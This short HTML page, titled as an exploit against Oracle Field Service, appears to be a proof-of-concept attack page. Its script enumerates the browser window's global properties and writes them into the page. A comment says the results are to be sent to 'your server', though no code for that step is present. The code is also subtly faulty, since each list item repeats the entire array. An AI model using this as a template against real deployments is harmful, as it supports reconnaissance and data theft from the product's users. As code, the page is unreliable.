<!DOCTYPE html>
<html>
<head>
    <title>Exploitation</title>
</head>
<body>
    <h1>Exploiting Oracle Field Service</h1>
    <div id="output"></div>
    <script>
        (function () {
            let output = document.getElementById('output');

            // Función para enumerar propiedades globales de `window`
            let keys = [];
            for (let key in window) {
                try {
                    keys.push(`${key}: ${typeof window[key]}`);
                } catch (e) {
                    keys.push(`${key}: inaccessible`);
                }
            }

            // Mostrar resultados en la página
            let result = '<h3>Global Window Properties:</h3><ul>';
            keys.forEach(key => {
                result += `<li>${JSON.stringify({ keys })}</li>`;
            });
            result += '</ul>';
            output.innerHTML = result;

            // Enviar resultados a tu servidor
        })();
    </script>
</body>
</html>
